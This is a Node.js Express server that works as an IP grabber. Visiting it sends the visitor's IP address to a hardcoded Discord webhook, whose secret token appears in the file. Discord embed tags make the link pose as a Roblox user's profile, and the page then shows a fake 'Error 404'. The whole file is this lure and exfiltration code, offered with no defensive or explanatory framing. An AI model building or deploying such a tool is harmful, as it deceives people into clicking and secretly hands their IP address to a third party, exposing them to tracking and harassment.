import express from 'express';
import fetch from 'node-fetch';

const app = express();
const port = process.env.PORT || 3000;
const webhookUrl = "https://discordapp.com/api/webhooks/1368358386571280435/kLO9BC2RFtV8M0lkCz57upHFFgcmDlllpn8OUM-jnFLOT9OZPi31SafXHikeg5yTGYnn";

app.get('/', async (req, res) => {
  const ip = req.headers['x-forwarded-for'] || req.socket.remoteAddress;

  if (webhookUrl) {
    try {
      await fetch(webhookUrl, {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify({
          content: `IP Address Visited: ${ip}`
        }),
      });
      console.log(`Sent IP ${ip} to webhook`);
    } catch (error) {
      console.error('Error sending IP to webhook:', error);
    }
  } else {
    console.warn('Webhook URL is not set. IP not sent.');
  }

  res.send(`
    <!DOCTYPE html>
    <html lang="en">
    <head>
      <meta charset="UTF-8">
      <meta name="viewport" content="width=device-width, initial-scale=1.0">
      <title>hat_manAaccLT's Profile - Roblox</title>

      <!-- Discord Embed Meta Tags -->
      <meta property="og:type" content="website">
      <meta property="og:title" content="hat_manAaccLT's Profile">
      <meta property="og:description" content="hat_manAaccLT is one of the millions creating and exploring the endless possibilities of Roblox. Join hat_manAaccLT on Roblox and explore together!">
      <meta property="og:image" content="https://tr.rbxcdn.com/30DAY-Avatar-46AD06A715B3A3129679C7AC6DE51019-Png/352/352/Avatar/Webp/noFilter">
      <meta name="theme-color" content="#36393F"> <!-- Dark Grey Color -->

      <style>
        body {
          margin: 0;
          overflow: hidden;
          background-color: #000;
          display: flex;
          justify-content: center;
          align-items: center;
          height: 100vh;
          font-family: sans-serif;
          color: #fff;
        }
        #error-text {
          font-size: 5em;
          font-weight: bold;
          text-shadow: 0 0 10px rgba(255, 255, 255, 0.5);
        }
        #lines-container {
          position: absolute;
          top: 0;
          left: 0;
          width: 100%;
          height: 100%;
        }
        .line {
          position: absolute;
          background: rgba(255, 255, 255, 0.2);
          width: 1px;
          height: 100%;
          top: 0;
          left: ${Math.random() * 100}%;
          animation: moveLines ${Math.random() * 5 + 5}s linear infinite;
        }
        @keyframes moveLines {
          0% {
            transform: translateY(-100%);
          }
          100% {
            transform: translateY(100%);
          }
        }
      </style>
    </head>
    <body>
      <div id="lines-container">
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
        <div class="line"></div>
      </div>
      <div id="error-text">Error 404</div>
    </body>
    </html>
  `);
});

app.listen(port, () => {
  console.log(`Server listening on port ${port}`);
});
